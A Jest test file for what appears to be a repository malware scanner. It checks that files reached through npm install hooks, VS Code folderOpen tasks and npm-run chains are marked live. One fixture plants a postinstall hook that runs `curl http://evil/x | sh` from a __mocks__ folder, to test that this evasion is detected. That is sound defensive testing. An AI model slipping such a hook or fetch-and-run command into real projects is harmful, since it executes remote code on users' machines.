import { buildScanMap } from './mapper';
import type { RepoFiles } from './self-scan';

function repo(map: Record<string, string>): RepoFiles {
    return { paths: Object.keys(map), read: async (p) => map[p] ?? null };
}

describe('buildScanMap — reachability (LIVE vs DEAD)', () => {
    it('follows a hook → entry → static imports as LIVE; leaves unimported code DEAD', async () => {
        const m = await buildScanMap(
            repo({
                'package.json': JSON.stringify({ scripts: { postinstall: 'node server/server.js' } }),
                'server/server.js': `const r = require('./routes');`,
                'server/routes.js': `module.exports = require('./controllers/auth');`,
                'server/controllers/auth.js': `exports.x = 1;`,
                'src/Button.tsx': `export const B = 1;`, // never imported by an auto-run path
            }),
        );
        expect(m.live).toEqual(['server/controllers/auth.js', 'server/routes.js', 'server/server.js']);
        expect(m.dead).toContain('src/Button.tsx');
        expect(m.triggers[0]).toMatchObject({ kind: 'install_hook', entries: ['server/server.js'] });
    });

    it('treats a folderOpen task target as LIVE', async () => {
        const m = await buildScanMap(
            repo({
                'package.json': '{}',
                '.vscode/tasks.json': JSON.stringify({
                    tasks: [{ label: 'env', runOptions: { runOn: 'folderOpen' }, command: 'node init.js' }],
                }),
                'init.js': `console.log(1);`,
            }),
        );
        expect(m.live).toContain('init.js');
        expect(m.triggers.some((t) => t.kind === 'vscode_task')).toBe(true);
    });

    it('closes the test-folder evasion: malware in __mocks__ run by a hook is LIVE', async () => {
        const m = await buildScanMap(
            repo({
                'package.json': JSON.stringify({ scripts: { postinstall: 'node __mocks__/evil.js' } }),
                '__mocks__/evil.js': `require('child_process').exec('curl http://evil/x | sh');`,
            }),
        );
        expect(m.live).toContain('__mocks__/evil.js');
    });

    it('flags dynamic require in a LIVE file as unresolved (fail-loud)', async () => {
        const m = await buildScanMap(
            repo({
                'package.json': JSON.stringify({ scripts: { postinstall: 'node loader.js' } }),
                'loader.js': `const mod = require(process.env.STAGE);`,
            }),
        );
        expect(m.live).toContain('loader.js');
        expect(m.unresolved).toContain('loader.js');
    });

    it('follows npm-run indirection (prepare → npm run build → node scripts/x.js)', async () => {
        const m = await buildScanMap(
            repo({
                'package.json': JSON.stringify({ scripts: { prepare: 'npm run build', build: 'node scripts/x.js' } }),
                'scripts/x.js': `console.log('build');`,
            }),
        );
        expect(m.live).toContain('scripts/x.js');
    });

    it('no auto-run triggers → nothing LIVE, all source DEAD', async () => {
        const m = await buildScanMap(
            repo({
                'package.json': JSON.stringify({ scripts: { build: 'tsc', test: 'jest' } }),
                'src/index.ts': `export const a = 1;`,
                'src/util.ts': `export const b = 2;`,
            }),
        );
        expect(m.live).toEqual([]);
        expect(m.dead).toEqual(['src/index.ts', 'src/util.ts']);
        expect(m.unresolved).toEqual([]);
    });
});
